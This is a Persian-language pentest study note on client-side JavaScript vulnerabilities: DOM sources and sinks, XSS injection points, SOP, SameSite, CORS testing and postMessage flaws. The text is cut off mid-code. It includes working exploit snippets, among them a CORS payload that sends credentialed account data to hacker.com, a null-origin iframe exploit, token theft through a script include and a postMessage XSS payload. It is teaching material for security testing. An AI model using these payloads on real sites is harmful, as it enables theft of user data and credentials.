---
title: آسیب‌پذیری‌های سمت کلاینت JavaScript
aliases:
  - جزوه JS
  - Client-Side JS
  - XSS CORS CSRF
tags:
  - pentest
  - javascript
  - xss
  - cors
  - csrf
  - postmessage
  - prototype-pollution
  - waf
cssclasses:
  - rtl
dir: rtl
lang: fa
updated: 2026-09-03
---

# آسیب‌پذیری‌های سمت کلاینت (JavaScript)

جزوهٔ یکپارچه برای ابسیدین. منبع: ch01–ch06، POST-MESSAGE، section-01 تا section-06.

> [!abstract] چطور بخوان
> هر فصل مستقل است. مباحث ترکیبی (مثل XSRF+XSS) همان‌جا که زنجیره شکل می‌گیرد آمده‌اند.
> از فهرست زیر به heading بپر.
> بلوک‌های رنگی: نکته، هشدار، خطر، کار باز.

## فهرست

1. [[#بخش ۱ — مبانی: DOM و BOM]]
2. [[#بخش ۲ — تزریق JavaScript (روش‌های پایه)]]
3. [[#بخش ۳ — AJAX و Fetch]]
4. [[#بخش ۴ — SOP (Same-Origin Policy)]]
5. [[#بخش ۵ — CORS (Cross-Origin Resource Sharing)]]
6. [[#بخش ۶ — PostMessage]]
7. [[#بخش ۷ — CSRF (Cross-Site Request Forgery)]]
8. [[#بخش ۸ — XSS: انواع و مکانیزم]]
9. [[#بخش ۹ — XSS: کشف و اکسپلویت (Practice)]]
10. [[#بخش ۱۰ — کجاها XSS اجرا می‌شه (Sink Contexts کامل)]]
11. [[#بخش ۱۱ — ابزارهای XSS و Recon Automation]]
12. [[#بخش ۱۲ — XSSI (Cross-Site Script Inclusion)]]
13. [[#بخش ۱۳ — Unicode Normalization (WAF Bypass پیشرفته)]]
14. [[#بخش ۱۴ — نکات پراکنده و آیتم‌های باز (نیاز به تحقیق بیشتر)]]
15. [[#جمع‌بندی نهایی: زنجیره‌ی مفهومی کل جزوه]]

---


# بخش ۱ — مبانی: DOM و BOM

## DOM (Document Object Model)
یک API که از طریق JS به تگ‌های HTML (محتوای صفحه) دسترسی پیدا می‌کنیم. DOM، HTML و XML رو تبدیل به ابجکتی می‌کنه که JS می‌تونه باهاش کار کنه.

**شامل:**
- Cookies
- Local Storage
- Nonce / Token
- Content
- و غیره

## CRP (Critical Rendering Path)
اولویت‌بندی لود شدن CSS، HTML، JS و ... — تشکیل‌دهنده‌ی DOM قبل از شکل‌گیری.

## DOM Source (ورودی گرفته می‌شود)
- `document.url`
- `document.cookie`
- `location.hash` → مثال: `https://test.com/aouysdbcub#hello` (نکته: `/#data` برای بک‌اند نمی‌ره و توسط JS خونده و در فرانت باهاش کار می‌شه)
- `xhr.responseText`
- (از فصل بعد اضافه شد) `document.documentURI`, `history.pushState`, `location`, `document.referrer`, `history.replaceState`

## DOM Sink (اجرا می‌کند)
- `document.write` (مثلاً `document.write(location.hash)` — نکته: سینک وقتی معنا داره که Source بهش دیتا بده؛ اگه محتوای توش استاتیک باشه، فایده‌ای نداره)
- `innerHTML`
- `postMessage`
- `window.location.href`
- `eval`
- (از فصل بعد اضافه شد) `location`, `document.title`, `document.search`

## BOM (Browser Object Model)
- `window`
- مربوط به مرورگر: نسخه، سایز نمایشگر و ...

> [!note] نکته
> `document == window.document` — یعنی DOM زیرمجموعه‌ی BOM است: `document > window.document`
> سلسله‌مراتب: **BOM > DOM > HTML TAGS**

## DOM از دید داینامیک بودن
`document` در واقع یک فانکشن JS است (زبان اسکریپت‌نویسی داینامیک) که با HTML ما match می‌شه و تعامل بین این دو رو ممکن می‌کنه:
- **document** → HTML
- **object** → تگ‌ها و محتواها
- **model** → ساختار درختی (Tree Structure)، مثل: `<div><a href="www.chichi.com"></a></div>`

به‌طور کلی JS یک ابجکت از DOM صفحه در `document` می‌سازه برای خودش: دیتا از وب‌سرور میاد، تمام تگ‌ها لود می‌شن، بعد از تمومی فایل‌ها و تگ‌های HTML اون صفحه (لود شدن DOM)، ابجکت ساخته می‌شه و در `document` ذخیره می‌شه.

**اهداف تزریق JS:**
- Hijacking
- Sending (ارسال داده به بیرون)
- Changing the contents

> [!note] نکته درباره‌ی Source/Sink:
> مقداری که توسط کاربر وارد می‌شه، Source می‌شه. کاری که روی اون ورودی اعمال می‌شه، Sink می‌شه. Sink فقط زمانی برای ما معنا داره که توسط یه Source دیتا بهش بدیم — اگه محتوای Sink استاتیک باشه، فایده‌ای نداره.

---

# بخش ۲ — تزریق JavaScript (روش‌های پایه)

## حالت‌های کلی که JS ظاهر می‌شه (JS Parsing)

**۱. فایل جدای `.js` که Include می‌شه**
مثلاً یه تابع/متغیر تو یه فایل جدا ذخیره شده:
```javascript
// /var/www/html/jsfiles/main.js
var a = alert(10);
```
و در کد اصلی فراخوانده می‌شه (**دقت:** کد فقط جایی که فراخوانده می‌شه اجرا می‌شه):
```html
<!-- /var/www/html/index.html -->
<html>
....
<script src="adress js file"></script>
```
> فایل‌های JS برای استفاده‌ی مستقیم نیستن، برای فراخوانی شدن کاربرد دارن.

**۲. نوشتن مستقیم کد JS در بدنه‌ی سایت**
```html
<html>
....
<script>
var a = alert(10);
</script>
```

**۳. Attribute و Event**
مثلاً `href` یک attribute از تگ `a` هست و می‌شه داخلش JS تزریق کرد:
```html
<a href="\"> click on me </a>
<a href="javascript:alert(10)">click on me</a>
```
یا Event روی تگ‌ها:
```html
<img src="11111" onerror="var a = shumbul;alert(a)">
```
بعضی تگ‌ها باید تعامل (Interaction) داشته باشن تا کار کنن — مثلاً تگ `p` چیزی لود نمی‌کنه که به Error بخوره، ولی موس می‌تونه روش بره:
```html
<p onmouseover="alert(10)">hiiii</p>
```
یا `oncopy`, `oncut`, ...

## انواع Injection
- Include یک فایل `.js` → Stored XSS
- `<script> js code </script>`
- **Events:**
  - `<p onmouseover=alert(1)>ravin</p>`
  - `onclick`
  - `onfocus`
  - و غیره
- `src=javascript:alert(10)`

## مکان‌های ورودی (Input's Locations) — نمونه‌های کامل

**Sample-01: در بدنه‌ی صفحه (مثل تگ span, a, ...)**
```
https://target.com/search?q=VooRodi
→ VooRodi Not Found
→ در بدنه صفحه قرار می‌گیره
→ view-source:https://www.dafont.com/search.php?q=reza123
```

**Sample-02: در HTML Attributeهایی که توانایی اجرای JS رو ندارن**
```html
<a href="javascript:alert(1)">t</a>
<input value="reza"> <!-- Escape می‌شه -->
<img id="reza">
```

**Sample-03: در HTML Attributeهایی که توانایی اجرا دارن**
```html
<a href="reza">t</a>
```
مثال واقعی:
```
https://sso.bank-vuln.ir/login?returnUrl=/Portal
→ Portal را با javascript:alert(origin) جایگزین می‌کنیم
```

**Sample-04: در Event**
```html
<p onclick="var a = 'voorodi' ">
```

**Sample-05: مستقیم در تگ script**
```html
<script>
var a = "Voorodi"
</script>
```

**Sample-06: در تگ کامنت**
```html
<!-- Voorodi -->
-->
```

## مفاهیم پایه‌ی JS مرتبط با اکسپلویت
- **شرط‌ها:** `if/else`, `switch`
- **حلقه‌ها:** `for`, `while`
- **انواع داده:** array, int, float, ...
- **عملگرها:** `&&` (and), `||` (or)

### انواع داده‌ی کامل JS
```javascript
// String
let color = "Yellow";
let lastName = "Johnson";

// Number
let length = 16;
let weight = 7.5;

// BigInt
let x = 1234567890123456789012345n;
let y = BigInt(1234567890123456789012345)

// Boolean
let x = true;
let y = false;

// Object (دیکشنری)
const person = {firstName:"John", lastName:"Doe"};

// Array (لیست در پایتون)
const cars = ["Saab", "Volvo", "BMW"];

// Date object
const date = new Date("2022-03-25");

// Undefined
let x;
let y;

// Null
let x = null;
let y = null;

// Symbol
const x = Symbol();
const y = Symbol();
```
- **متغیرها:**
  - `let` → block scope
  - `var` → function scope
  - `const` → block scope + immutable reference

### نمونه کد پایه
```javascript
<script>
function name(input){
alert(input);
}
name("hiiiii");
```

```javascript
<script>
function name(input1, input2){
if(input==="admin" && input2 === true && userid===2){
alert("welcome admin");
}
elsif(input==="user" && input2 === false && userid===1){
alert("welcome user");
}
else{
alert("not loged in");
}
}
name("hiiiii");
```

```javascript
var numbers = [];
var i = 0;
var condition = true;
while (condition){
numbers.push(i);
i++;
if (i==5){
countinue}
if(i==7){
break // or var condition= false
}
document.write(numbers);
}
```

## روش‌های اینجکت JS به فرم لاگین (از طریق Event)

### ۱. از طریق فانکشن
```html
<!DOCTYPE html>
<html>
<body>
<h1>JavaScript Functions</h1>
<input id="username" name="username" placeholder="username" type="text">
</br>
<input id="password" name="password" placeholder="passsword" type="text">
<button id="btn" onclick="reader()">click me</button>
<p id="demo"></p>
<script>
function reader(){
alert(document.getElementById('username').value);
document.write(document.getElementById('password').value); // رو کل صفحه می‌نویسه
}
</script>
</body>
</html>
```

### ۲. مستقیم روی Event
```html
<button id="btn" onclick="alert(document.getElementById('username').value);
alert(document.getElementById('password').value)">click me</button>
```

**فایده:** ارسال لیست پسورد/یوزرنیم به سرور از طریق fetch, ajax(xhr)

### اگر Event یا تگ نبود؟ → تگ اضافه می‌کنیم
```html
<script>
var btn = document.getElementById('btn');
btn.addEventListener("click", ()=> {
var a = document.getElementById('username').value;
var b = document.getElementById('password').value;
var x = document.queryselector(#x).value;
alert(a);
alert(b)
})
</script>
```

### اجرای کد قبل از رفتن به یک لینک
```html
<a href="www.google.com" id="linked">here</a>
<script>
var mew = document.getelementbyid("linked");
mew.addeventlistener("click",(event)=>{document.write(event.target.href)})
// event برابر ابجکتی قرار می‌گیره که ایدیش سلکت شده
</script>
```

## Magic Events
`onmouseover`, `oncopy`, `oncut`, `onclick` و ... — روی هر تگی حتی چرت‌وپرت کار می‌کنن.

## توابع زمان‌بندی
- `setTimeout(function(){},1000)` → اجرای تابع بعد از ۱ ثانیه
- `setInterval(function(){},1000)` → هر ۱ ثانیه تابع اجرا می‌شه
- `var date = new Date()` → ساخت ابجکت از کلاس Date
- `var now = date.toTimeString()` / `alert(now)`

### مثال: ساعت زنده روی صفحه
```html
<script>
function timer(){
var date = new Date();
var now = date.toTimeString();
var mew = document.getElementById("demo");
mew.innerText=(now)
}
setInterval(timer, 1000);
</script>
```

> [!todo] شیطنت با JS
> (نیاز به تحقیق بیشتر): jscript، caplets، bettercap

---

# بخش ۳ — AJAX و Fetch

## AJAX چیست؟
وقتی وارد یه سایت می‌شی و محتوای سایت بدون اینکه خودت درخواست بزنی دائم بروز می‌شه (مثل لود تبلیغات بیشتر در دیوار بدون رفرش). مرورگر درخواست `XMLHttpRequest` به سرور می‌زنه و سرور دیتای جدید رو در اختیار مرورگر قرار می‌ده — بدون درگیر شدن کاربر محتوا بروز می‌شه.

### دیاگرام Workflow
```
Browser: رخداد یک Event → ساخت XMLHttpRequest object → ارسال HttpRequest
         ↓ (Internet)
Server: پردازش HTTPRequest → ساخت Response و ارسال به Browser
         ↓ (Internet)
Browser: پردازش داده‌ی برگشتی با JavaScript → آپدیت محتوای صفحه
```

## تمرین پایه
```html
<script>
const xhr = new XMLHttpRequest;
console.log(xhr);
</script>
```
- `XMLHttpRequest` → یک کلاس
- `xhr` → یک ابجکت از اون کلاس

### پراپرتی‌های مهم XHR
- `readyState` → مثلاً state 4 یعنی کامل لود شده
- `onreadystatechange` → هروقت readyState تغییر کنه فراخوانی می‌شه
- `responseText` → جواب به‌صورت متن
- `responseType` → می‌تونی تعیین کنی مثلاً `document` باشه تا با DOM کنترلش کنی
- `status` → کد وضعیت (200, 300, ...)
- `withCredentials` → ارسال توکن به سایت
- `setRequestHeader()` → ست کردن هدر

### حالت‌های readyState
```
0 -> UNSENT
1 -> OPENED
2 -> HEADERS_RECEIVED
3 -> LOADING
4 -> DONE
```

### مثال کامل: خوندن محتوای صفحه‌ی دیگر با XHR
```html
<script>
function sendReq(){
    const xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function(){
       if(this.readyState == 4 && this.status == 200){
            var body_info = this.responseText;
            var inject_in_site = document.createElement("div");
            inject_in_site.innerHTML = body_info;
            document.body.appendChild(inject_in_site);
   }
 }
    xhr.open("GET", "http://127.0.0.1:5500/targer.html")
    xhr.send();
}
</script>
```

> [!warning] مشکل
> کد اجرا می‌شه ولی نمی‌تونی از `responseText` تگ یا ایدی خاصی سلکت کنی برای تزریق به المنت — چون به‌صورت متن رسپانس رو گرفتی و چیزی روش نمی‌شه سلکت کرد.

### راه‌حل: `responseType = "document"`
```html
<script>
function sendReq(){
    const xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.onreadystatechange = function(){
       if(this.readyState == 4 && this.status == 200){
            var body_info = this.response;
            var inject_in_site = document.createElement("div");
            inject_in_site.innerHTML = body_info.getElementById("targettagid").textContent;
            document.body.appendChild(inject_in_site);
   }
 }
    xhr.open("GET", "http://127.0.0.1:5500/targer.html")
    xhr.send();
}
</script>
```

## Fetch
JS تک‌ریسمانه (single thread) — یعنی یه خط باید اجرا بشه و بره خط بعد. اگه از AJAX استفاده کنیم باید منتظر بمونیم کل فرایند تموم بشه تا بقیه‌ی کد به ترتیب اجرا بشه.

Call back functionهای XHR و Promiseهایی که با Fetch داریم، برای همین "چندریسمانی به‌ظاهر" هستن. کال‌بک فانکشن‌ها تو مثال‌هایی مثل دزدیدن CSRF token خیلی پیچیده می‌شدن، پس از Promise استفاده می‌کنیم — تمیزتر و مدرن‌تره. `fetch` یک فانکشنه که خروجیش Promise هست.

### مثال پایه Fetch
```html
<script>
function sendReq(){
	const fetchreq =
	fetch("http://127.0.0.1:5500/targer.html" , {"method":"GET"})
  fetchreq.then((response)=>{
  return response.text()
  }).then((text)=>{
    console.log(text)
  })
 }
</script>
```

### انتخاب تگ خاص از رسپانس Fetch
```html
<script>
function sendReq(){
  const fetchreq =
  fetch("http://127.0.0.1:5500/targer.html" , {"method":"GET"})
  fetchreq.then((response)=>{
  return response.text()
  }).then((html)=>{
        // تبدیل HTML دریافتی به DOM موقت
 const temp = document.createElement("div");
 temp.innerHTML = html;
      // پیدا کردن عنصر مورد نظر
 const target = temp.querySelector("#");
    // ساخت div در صفحه اصلی
 const newDiv = document.createElement("div");
          // ریختن محتوا داخلش
 newDiv.innerHTML = target.innerHTML;
               // اضافه کردن به صفحه اصلی
 document.body.appendChild(newDiv);
 })
 }
</script>
```

نکته: وقتی `fetch("target", ...)` می‌نویسیم و جلوش `.then` می‌زنیم یعنی در صورت موفقیت این کارو بکن. خروجی تابعی که `return` کردیم، ورودی تابع بعدی (`.then` بعدی) می‌شه.

---

# بخش ۴ — SOP (Same-Origin Policy)

اگه از سایت A بخوایم به سایت B درخواست بزنیم، درخواست با موفقیت ارسال می‌شه و جواب هم برمی‌گرده، ولی **مرورگر اجازه‌ی خوندن رسپانس به JS رو نمی‌ده** چون پالیسی روی مرورگر ست شده. مثلاً اگه AJAX به یه origin مختلف بزنی، SOP جلوشو می‌گیره.

## چرا با XSS، SOP جلوشو نمی‌گیره؟
چون SOP فقط جلوی *خونده شدن رسپانس توسط JS* رو می‌گیره، ولی با XSS تارگت خودش اطلاعات رو می‌فرسته (نه اینکه بخونه) و این کاملاً توی محدوده‌ی مجاز SOP هست.

## ارتباط با CSRF
وقتی درخواست از سمت سایت هکر با مرورگر قربانی ارسال می‌شه، مشکلی در این مراحل نیست — فقط هکر رسپانس رو نمی‌بینه، ولی درخواست تایید شده (مثل انتقال پول) با انجام شدنش خودش نتیجه رو نشون می‌ده.

## تعریف Origin
- Same host
- Same port
- Same protocol

> [!warning] نکته
> origin جایی در نظر گرفته می‌شه که کد در آن **Execute** می‌شود.

### مثال
سایت A این کد رو داره تا JS سایت B در سایت A اجرا بشه:
```javascript
<script src="http://SITEB.com"></script>
```
origin این کد چی می‌شه؟ → **همون origin سایت A**

> [!danger] نکتهٔ خطرناک
> مرورگر اجازه‌ی بارگذاری Cross-Origin برای تگ `<script>` رو می‌ده، اما بعد از اجرا، کد با Origin صفحه‌ی میزبان اجرا می‌شه. یعنی می‌تونی محتوای JS سایت‌های دیگه رو بخونی — خطرناک‌ترین حالت: ذخیره شدن Token مهم در یک فایل JS.

### سناریوی واقعی: دزدیدن Token از فایل JS
سایتی که با SSO کاربر رو وریفای می‌کنه و توکن احراز هویت رو در یه فایل JS ذخیره می‌کنه:

```javascript
// PATH: WWW.TARGET.COM/USER/TOKEN.JS
VAR TOKEN = "SOD6481435(@$)%RDS"
```

نفوذ (کد اتکر در سایت خودش):
```javascript
<Script src="مسیر ذخیره شدن توکن">
document.write("TOKEN HIJACKED" + TOKEN)
</SCRIPT>
```
در صورت لاگین بودن قربانی، توکن دزدیده می‌شه.

> [!note] نکته
> اکثر سایت‌های SSO گزینه‌ی SameSite خاموشه برای کوکی‌شون.

## SameSite Cookies (تفاوت با SOP)
**تفاوت مفهومی مهم:** SameSite جلوی *ارسال* کوکی همزمان با درخواست رو می‌گیره؛ SOP جلوی *دریافت* رسپانس رو می‌گیره. این دو مکانیزم جدا از همدیگه‌ن.

`Original Domain`: سخت‌گیری سر ساب‌دامنه‌ها نداریم. `Same Protocol` هم شرط دیگه‌ایه.

**سه مقدار SameSite:**
| مقدار | رفتار |
|---|---|
| `None` | کوکی همیشه ارسال می‌شه، حتی Cross-Site |
| `Lax` | اگه درخواست از طریق HTML باشه (مثل submit شدن یک `form`) کوکی ارسال می‌شه؛ ولی اگه از طریق JS باشه (مثل `fetch`/`ajax`) ارسال نمی‌شه |
| `Strict` | فرقی نداره فرم چیه — در هر صورت اگه Same-Site نباشه، کوکی نمی‌ره |

> [!note] نکته
> اگه `Strict` بود چی؟ در این حالت باید دنبال ساب‌دامنه‌های دامنه‌ی اصلی بگردیم تا بتونیم روشون XSS بزنیم و از همون ساب‌دامنه (که Same-Site محسوب می‌شه) AJAX بزنیم.

(روش‌های عملی Bypass کردن SameSite Lax/Strict برای CSRF در بخش ۷ — CSRF — به‌طور کامل توضیح داده شده.)

---

# بخش ۵ — CORS (Cross-Origin Resource Sharing)

مکانیزمی که مشخص می‌کنه کدوم Sourceها تو Originت اجازه دارن منابع رو بخونن (مثل زدن AJAX و خوندن جواب) — مکانیزم تبادل اطلاعات بین دامین اصلی و ساب‌دامین‌ها بدون مزاحمت SOP.

## شروط CORS

**Request Headers:**
- `Origin`

**Response Headers:**
- `Access-Control-Allow-Origin`
- `Access-Control-Allow-Credentials` → اگه `true` باشه، اجازه می‌ده کوکی کاربر با درخواست ارسال بشه. ولی اگه گزینه‌ی اول (Allow-Origin) ستاره `*` باشه، این خودبه‌خود `false` می‌شه.
- `Access-Control-Allow-Methods`
- `Access-Control-Allow-Headers`

### مثال تست
```
origin: test.com => response {
	access-control-allow-origin = test.com
	access-control-allow-credentials = true
	no custom random header like:
		- authorization with random tokens
		- bearer
		- jwt
		- csrf token
	# چون هدر و مقدار رندوم از این آسیب‌پذیری جلوگیری می‌کنه
	# ولی اگه توی کوکی ست شده باشه، باگ امنیتی خطرناکیه
	# نکته مهم: چرا جلوگیری می‌کنه و کجا چک می‌کنه
	# اگه هیچ‌کدوم از این هدرا برنگشتن یعنی باگ نیست، دست‌وپا نزن
}
```

## Simple Request
**Methods:** POST, GET, HEAD
**Headers:** Accept, Accept-Language, Content-Type

## Preflight Requests
`OPTIONS request` → قبل از `normal request` می‌آد.
**Headers:** Custom headers مثل `x_op = true`

مرورگر اول می‌پرسه:
- آیا این متود اوکیه؟
- آیا این origin اجازه‌ی خوندنشو داره؟
- آیا این هدرها اوکیه فرستادنش؟
بعد که اوکی داد، درخواست اصلی رو می‌فرسته.

| هدر | وظیفه |
|---|---|
| Access-Control-Allow-Origin | چه Originی حق خواندن پاسخ را دارد |
| Access-Control-Allow-Headers | چه Headerهایی مجازند |
| Access-Control-Allow-Methods | چه Methodهایی مجازند |
| Access-Control-Allow-Credentials | آیا Cookie/Credential مجاز است |

## CORS Test Flow (روش کامل تست)

**۱. تست با دامنه اصلی:**
```
target: test.com
Origin: test.com
→ Access-Control-Allow-Origin: test.com
→ Access-Control-Allow-Credentials: true
```

**۲. تست با ساب‌دامنه‌های مختلف:**
```
Origin: a.test.com
→ Access-Control-Allow-Origin: a.test.com
→ Access-Control-Allow-Credentials: true
```

**۳. تست با دامنه‌ی جعلی که اسم دامنه‌ی اصلی توش هست (Bad Regex):**
```
Origin: test.com.hacker.com

Response 1 (آسیب‌پذیر):
→ Access-Control-Allow-Origin: test.com.hacker.com
→ Access-Control-Allow-Credentials: true

Response 2 (سالم):
→ Access-Control-Allow-Origin: *
→ Access-Control-Allow-Credentials: true (این ترکیب در واقع نامعتبره چون credentials با * نمیاد)
```
در مرحله‌ی سوم از bad regex سوءاستفاده می‌کنیم و ساب‌دامنه‌ی شخصی می‌دیم به‌عنوان ساب معتبر، چون ممکنه صرفاً حضور اسم دامنه در کل دامنه‌ی اصلی براشون مهم باشه، نه چیز دیگه‌ای.

**۴. تست با `Origin: null`:**
```
Origin: null
→ Access-Control-Allow-Origin: null
→ Access-Control-Allow-Credentials: true
```
آسیب‌پذیری مخصوص خودشو داره — اکسپلویتش در ریپو گیت‌هاب `swisskyrepo` قابل مشاهده است.

**۵. تست با `127.0.0.1`:**
```
Origin: 127.0.0.1
→ Access-Control-Allow-Origin: 127.0.0.1
→ Access-Control-Allow-Credentials: true
```
خطرناک‌ترین Misconfiguration.

> [!warning] نکتهٔ مهم
> CORS باید روی صفحه‌ای زده بشه که اطلاعات مهم روشه، تا با AJAX/Fetch بشه اطلاعات رو دزدید — وگرنه Impact نداره.

منبع تکمیلی: مقاله‌ی ویرگول پارسا (نیاز به مطالعه‌ی بیشتر).

## قاعده‌ی GET/POST برای ساب‌دامنه در تست عملی
اگه تارگت تو ساب‌دامنه باشه، مهم نیست با GET جواب می‌گیریم یا POST. اما در دنیای واقعی، اگه فقط با POST جواب می‌گرفتیم، باید دنبال ساب‌دامنه بگردیم (چون POST معمولاً State-Changing است و ریسک بیشتری داره برای اجازه دادن با CORS). ولی اگه GET جواب داد، می‌شه با **Open Redirect** دورش زد.

## روش کامل تست عملی (Practical Test Flow)
CORS رو فقط جایی تست می‌کنیم که **دیتای کاربر بعد از لاگین برگرده برامون** (وگرنه Impact نداره).

مراحل:
۱. می‌گردیم تو Request و وارد Repeater می‌کنیم
۲. تو بدنه‌ی هدر، `origin: request host` رو وارد می‌کنیم
۳. بعدش یه هاست دیگه رو تست می‌کنیم
۴. بعدش یه ساب‌دامنه‌ی خودساخته (مثل `mobin.host.com`) — در صورت آسیب‌پذیر بودن، قابلیت زدن CORS رو داره

### Exploit ۱: دزدیدن دیتا با btoa (وقتی origin آسیب‌پذیره)
```javascript
<script>
xhttp = new XMLHttpRequest();
xhttp.onload = () => {
xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://hacker.com/data?exp="+btoa(xhttp.responseText))
xhttp2.send()
 };
xhttp.withCredentials = true;
xhttp.open("GET", "https://0a5900b403fec638805f170100cf00aa.web-security-academy.net/accountDetails");
// if get method didnt work you can try post
xhttp.send();
<script>
```

### تست‌های بیشتر: هاست اصلی به‌عنوان ساب‌دامنه
بعدش هاست اصلی رو به‌عنوان ساب‌دامنه می‌ذاریم: `host.mobin.com`، یا حتی چسبوندنش: `mobinhost.com`.

### Exploit ۲: شبیه‌سازی `Origin: null` با iframe
`null` origin یعنی چی؟ اجازه می‌ده یوزر از localhost درخواست بزنه، ولی ما می‌تونیم با iframe این origin رو شبیه‌سازی کنیم:
```html
<iframe sandbox="allow-scripts allow-forms allow-top-navigation" srcdoc='<script>
xhttp = new XMLHttpRequest();
xhttp.onload = () => { document.write(responseText); };
xhttp.withCredentials = true;
xhttp.open("GET", "https://0a5900b403fec638805f170100cf00aa.web-security-academy.net/accountDetails");
xhttp.send();
<script>'></iframe>
```
توی این کد می‌تونیم به‌جای `document.write` دوباره AJAX بزنیم و با ارسال این قطعه‌کد به ادمین، کردنشیالزش رو بدزدیم.

### نکات نهایی CORS
- باید Cookie-Based باشه (نه Header/Token-Based)
- تو اکسپلویت حتماً `https` وارد بشه

---

# بخش ۶ — PostMessage

## چرا بررسی PostMessage برای هکرها ارزشمنده؟
برای پاسخ به این سؤال باید ماهیت PostMessage رو بفهمیم تا با درک درست بتونیم Vulnerabilityها رو شناسایی و اکسپلویت کنیم.

## چیست؟
PostMessage ساخته شد تا صفحات وب با Originهای مختلف، بدون محدودیت‌های SOP، باهم تبادل دیتا داشته باشن.

### مثال واقعی: زیردامنه‌های گوگل
- support.google.com
- mail.google.com
- meet.google.com
- accounts.google.com

چون Host این‌ها متفاوته (از شروط SOP)، مرورگر SOP رو روی همه‌شون اعمال می‌کنه و نمی‌تونن رسپانس درخواست‌های همدیگه رو از طریق مرورگر بخونن (رسپانس میاد ولی مرورگر اجازه‌ی رسیدنش رو نمی‌ده).

اما نیاز دارن بفهمن کاربر لاگین هست یا نه، اطلاعات اکانتش چیه و ... — پس نیاز به یک راه بدون مزاحمت SOP دارن: **PostMessage**.

## Workflow واقعی (مثال Gmail)
۱. وارد اینباکس Gmail می‌شی
۲. سشن لاگین ست نشده، `mail.google.com` یک **child** باز می‌کنه که توش لاگین می‌کنی:
```javascript
var child = window.open(login.google.com, name, optional_settings)
```
۳. بعد از وارد کردن اطلاعات، child پس از authorize کردن، یک توکن ست می‌کنه و برای parent می‌فرسته:
```javascript
postMessage(token, "mail.google.com")
```
۴. **Parent** منتظر دریافت توکن هست:
```javascript
window.addEventListener("message", (event) => { var token = event.token })
```
Event `message` مخصوص دریافت postMessage است. با توابعی که برنامه‌نویس در نظر گرفته، سشن و کوکی‌های مربوطه ست می‌شن — و لاگین از طریق یک tab/window/iframe جدید انجام می‌شه.

> [!note] SSO:
> متودی که با یک‌بار لاگین، در همه‌ی خدمات یک شرکت لاگین می‌شی.
> **Parent/Child:** Parent = صفحه‌ای که در آن `window.open` اجرا شده. Child = صفحه‌ای که فراخوانی شده.

## مثال ساده‌ی کد PostMessage

**Parent:**
```html
<!DOCTYPE html>
<body>
 <button type="button" id="btn" value="sendmessage" onclick="sendpostmsg()">click me</button>
 <script>
var child = window.open("http://127.0.0.1:5500/child.html");
 function sendpostmsg(){
var msg = {thisone : "hi this is the data"}
child.postMessage(msg, "*");
 }
 </script>
</body>
</html>
```

**Child:**
```html
<!DOCTYPE html>
<body>
    <b id="mytag">first data</b>
    <script>
    window.addEventListener("message",(event)=>{
        var para = document.getElementById("mytag")
        para.innerText = event.data.thisone
    })
    </script>
</body>
</html>
```

نکته: جفت پدر و فرزند می‌تونن دیتا بگیرن و بخونن، ولی برای درک ساده می‌گیم پدر فرستنده و فرزند گیرنده‌ست. برای ساخت listener باید event `message` ست شده باشه.

## window.open vs `<a href>`
فرق `window.open(url)` با `<a href="test.com">mew</a>`: دومی یه تب جدید باز می‌کنه و همونجا اجرا می‌شه، ولی PostMessage یه رابطه شکل می‌ده با تب جدید و کنارش باز می‌مونه. اگه در صفحه‌ی parent یک `window.open` زده بشه، به child یک رابطه‌ی postMessage شکل می‌گیره.

---

## Misconfiguration های PostMessage

### ⚠️ آسیب‌پذیری ۱: XSS از طریق PostMessage

**سناریو:** یک وب‌اپ گیم داریم — parent اطلاعاتی رو (username, score) ثبت می‌کنه و از طریق postMessage برای child (که leaderboard است) می‌فرسته و اونجا **رفلکت** می‌شه.

**Parent:**
```html
<!DOCTYPE html>
<html>
<head><title>Game Portal</title></head>
<body>
    <h2>🎮 Game Portal</h2>
    <input type="text" id="username" value="H4ck3r">
    <input type="number" id="score" value="9999">
    <button onclick="sendData()">Submit</button>
    <iframe src="http://child-address.com/leaderboard" id="leaderboard"></iframe>
    <script>
        function sendData() {
            const username = document.getElementById('username').value;
            const score = document.getElementById('score').value;
            // ❌ آسیب‌پذیر: داده بدون اعتبارسنجی و با targetOrigin: "*"
            const message = `user:${username}|score:${score}`;
            document.getElementById('leaderboard').contentWindow.postMessage(message, "*");
        }
    </script>
</body>
</html>
```

**Child:**
```html
<!DOCTYPE html>
<html>
<head><title>Leaderboard</title></head>
<body>
    <h2>🏆 Leaderboard</h2>
    <div id="entries">
        <p>Player_One - 1500</p>
        <p>Warrior_99 - 1200</p>
    </div>
    <div id="new-entry"></div>
    <script>
        window.addEventListener('message', function(event) {
            const container = document.getElementById('new-entry');
            container.innerHTML = event.data.replace('user:', '👤 ').replace('|score:', ' - 🏅 ');
        });
    </script>
</body>
</html>
```

**VULNERABILITY:** ورودی بدون هیچ بررسی برای child ارسال می‌شه — **حتی اگه این بررسی در Parent با JS انجام بشه هم قابل دور زدنه** (چون از کنسول مرورگر می‌شه مستقیم فراخوانیش کرد). چایلد هم بدون بررسی اینکه message از کجا اومده، مستقیم render می‌کنه:
```javascript
window.addEventListener('message', function(event) {
    const container = document.getElementById('new-entry');
```
عدم حضور این چک باعث عدم بررسی origin می‌شه — راه‌حل درست باید این باشه:
```javascript
IF(!EVENT.ORIGIN===example.com){
break
}
```

**دو مشکل اصلی:**
۱. ولیدیت نشدن دیتای ارسالی
۲. چک نشدن origin فرستنده‌ی message (`event.origin`)

**Exploit:**
```html
<!DOCTYPE html>
<html>
<body>
    <script>
        const iframe = document.createElement('iframe');
        iframe.src = 'http://child-address.com/leaderboard';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        iframe.onload = function() {
            // 💀 پیلود برای alert عدد 10
            const payload = `user:<img src=x onerror="alert(10)">|score:9999`;
            iframe.contentWindow.postMessage(payload, '*');
        };
    </script>
</body>
</html>
```

---

### ⚠️ آسیب‌پذیری ۲: Data Hijacking

**سناریو:** وارد سایت A می‌شیم که نیاز به لاگین داره، پس صفحه‌ی لاگین به‌عنوان child باز می‌شه. از صفحه‌ی لاگین دیتا برای سایت A ارسال می‌شه.

**Parent (Shop.com):**
```html
<!DOCTYPE html>
<html>
<head><title>Shop.com</title></head>
<body>
    <h2>🛒 Welcome to Shop.com</h2>
    <button onclick="openLogin()">Login</button>
    <div id="user-info">Not logged in</div>
    <script>
        let loginWindow;
        function openLogin() {
            loginWindow = window.open('http://auth.shop.com/login', 'Login', 'width=400,height=500');
        }
        window.addEventListener('message', function(event) {
            const data = JSON.parse(event.data);
